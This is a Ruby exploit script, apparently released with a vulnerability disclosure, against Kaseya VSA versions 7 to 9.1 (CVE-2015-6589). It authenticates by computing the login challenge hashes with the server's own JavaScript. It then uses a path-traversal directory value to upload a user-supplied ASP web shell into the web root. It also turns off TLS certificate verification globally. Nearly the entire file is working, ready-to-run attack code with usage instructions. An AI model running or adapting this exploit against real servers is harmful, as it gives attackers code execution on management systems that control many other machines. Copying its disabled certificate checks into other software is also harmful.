#!/usr/bin/ruby
#
# kazPwn.rb - Kaseya VSA v7 to v9.1 authenticated arbitrary file upload (CVE-2015-6589 / ZDI-15-450)
# ===================
# by Pedro Ribeiro <pedrib@gmail.com> / Agile Information Security
# Disclosure date: 28/09/2015
#
# Usage: ./kazPwn.rb http[s]://<host>[:port] <username> <password> <shell.asp>
#
# execjs and mechanize gems are required to run this exploit
#
# According to Kaseya's advisory, this exploit should work for the following VSA versions:
# VSA Version 7.0.0.0 – 7.0.0.32
# VSA Version 8.0.0.0 – 8.0.0.22
# VSA Version 9.0.0.0 – 9.0.0.18
# VSA Version 9.1.0.0 – 9.1.0.8
# This exploit has been tested with v8 and v9.
#
# Check out these two companion vulnerabilities, both of which have Metasploit modules:
# - Unauthenticated remote code execution (CVE-2015-6922 / ZDI-15-449)
# - Unauthenticated remote  privilege escalation (CVE-2015-6922 / ZDI-15-448)
#
# This code is released under the GNU General Public License v3
# http://www.gnu.org/licenses/gpl-3.0.html
#

require 'execjs'
require 'mechanize'
require 'open-uri'
require 'uri'
require 'openssl'

# avoid certificate errors
OpenSSL::SSL::VERIFY_PEER = OpenSSL::SSL::VERIFY_NONE
I_KNOW_THAT_OPENSSL_VERIFY_PEER_EQUALS_VERIFY_NONE_IS_WRONG = nil

# Fixes a Mechanize bug, see
# http://scottwb.com/blog/2013/11/09/defeating-the-infamous-mechanize-too-many-connection-resets-bug/
class Mechanize::HTTP::Agent
  MAX_RESET_RETRIES = 10

  # We need to replace the core Mechanize HTTP method:
  #
  #   Mechanize::HTTP::Agent#fetch
  #
  # with a wrapper that handles the infamous "too many connection resets"
  # Mechanize bug that is described here:
  #
  #   https://github.com/sparklemotion/mechanize/issues/123
  #
  # The wrapper shuts down the persistent HTTP connection when it fails with
  # this error, and simply tries again. In practice, this only ever needs to
  # be retried once, but I am going to let it retry a few times
  # (MAX_RESET_RETRIES), just in case.
  #
  def fetch_with_retry(
    uri,
    method    = :get,
    headers   = {},
    params    = [],
    referer   = current_page,
    redirects = 0
  )
    action      = "#{method.to_s.upcase} #{uri.to_s}"
    retry_count = 0

    begin
      fetch_without_retry(uri, method, headers, params, referer, redirects)
    rescue Net::HTTP::Persistent::Error => e
      # Pass on any other type of error.
      raise unless e.message =~ /too many connection resets/

      # Pass on the error if we've tried too many times.
      if retry_count >= MAX_RESET_RETRIES
        puts "**** WARN: Mechanize retried connection reset #{MAX_RESET_RETRIES} times and never succeeded: #{action}"
        raise
      end

      # Otherwise, shutdown the persistent HTTP connection and try again.
      # puts "**** WARN: Mechanize retrying connection reset error: #{action}"
      retry_count += 1
      self.http.shutdown
      retry
    end
  end

  # Alias so #fetch actually uses our new #fetch_with_retry to wrap the
  # old one aliased as #fetch_without_retry.
  alias_method :fetch_without_retry, :fetch
  alias_method :fetch, :fetch_with_retry
end

if ARGV.length < 4
  puts 'Usage: ./kazPwn.rb http[s]://<host>[:port] <username> <password> <shell.asp>'
  exit -1
end

host = ARGV[0]
username = ARGV[1]
password = ARGV[2]
shell_file = ARGV[3]

login_url = host + '/vsapres/web20/core/login.aspx'
agent = Mechanize.new

# 1- go to the login URL, get a session cookie and the challenge.
page = agent.get(login_url)
login_form = page.forms.first
challenge = login_form['loginFormControl$ChallengeValueField']

# 2- calculate the password hashes with the challenge
source = open(host + "/inc/sha256.js").read
source += open(host + "/inc/coverPass.js").read
source += open(host + "/inc/coverPass256.js").read
source += open(host + "/inc/coverData.js").read
source += open(host + "/inc/passwordHashes.js").read
source.gsub!(/\<\!--(\s)*\#include.*--\>/, "")          # remove any includes, this causes execjs to fail
context = ExecJS.compile(source)
hashes = context.call("getHashes",username,password,challenge)

# 3- submit the login form, authenticate our cookie and get the ReferringWebWindowId needed to upload the file
# We need the following input values to login:
#   - __EVENTTARGET (empty)
#   - __EVENTARGUMENT (empty)
#   - __VIEWSTATE (copied from the original GET request)
#   - __VIEWSTATEENCRYPTED (copied from the original GET request; typically empty)
#   - __EVENTVALIDATION (copied from the original GET request)
#   - loginFormControl$UsernameTextbox (username)
#   - loginFormControl$PasswordTextbox (empty)
#   - loginFormControl$SubmitButton (copied from the original GET request; typically "Logon")
#   - loginFormControl$SHA1Field (output from getHashes)
#   - loginFormControl$RawSHA1Field (output from getHashes)
#   - loginFormControl$SHA256Field (output from getHashes)
#   - loginFormControl$RawSHA256Field (output from getHashes)
#   - loginFormControl$ChallengeValueField (copied from the original GET request)
#   - loginFormControl$TimezoneOffset ("0")
#   - loginFormControl$ScreenHeight (any value between 800 - 2048)
#   - loginFormControl$ScreenWidth (any value between 800 - 2048)
login_form['__EVENTTARGET'] = ''
login_form['__EVENTARGUMENT'] = ''
login_form['loginFormControl$UsernameTextbox'] = username
login_form['loginFormControl$SHA1Field'] = hashes['SHA1Hash']
login_form['loginFormControl$RawSHA1Field'] = hashes['RawSHA1Hash']
login_form['loginFormControl$SHA256Field'] = hashes['SHA256Hash']
login_form['loginFormControl$RawSHA256Field'] = hashes['RawSHA256Hash']
login_form['loginFormControl$TimezoneOffset'] = 0
login_form['loginFormControl$SubmitButton'] = 'Logon'
login_form['loginFormControl$screenHeight'] = rand(800..2048)
login_form['loginFormControl$screenWidth'] = rand(800..2048)
page = agent.submit(login_form)
web_windowId = Hash[URI::decode_www_form(page.uri.query)]['ReferringWebWindowId']

# 4- upload the file using the ReferringWebWindowId
page = agent.post('/vsapres/web20/json.ashx',
  'directory' => "../WebPages",
  'ReferringWebWindowId' => web_windowId,
  'request' => 'uploadFile',
  'impinf__uploadfilelocation' => File.open(shell_file)
)

if page.code == "200"
  puts "Shell uploaded, check " + host + "/" + File.basename(shell_file)
else
  puts "Error occurred, shell was not uploaded correctly..."
end